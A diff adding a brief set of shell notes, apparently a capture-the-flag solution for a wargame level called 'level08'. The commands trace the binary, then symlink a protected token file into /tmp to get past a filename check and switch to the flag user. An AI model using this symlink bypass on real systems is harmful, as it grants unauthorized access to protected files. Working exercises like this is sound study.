@@ -1,0 +1,12 @@
+ltrace ./level08 token
+
+echo ok > /tmp/some
+./level08 /tmp/some
+
+cp /home/user/level08/token /tmp/some
+
+========
+
+ln -s /home/user/level08/token /tmp/link
+./level08 /tmp/link
+su flag08
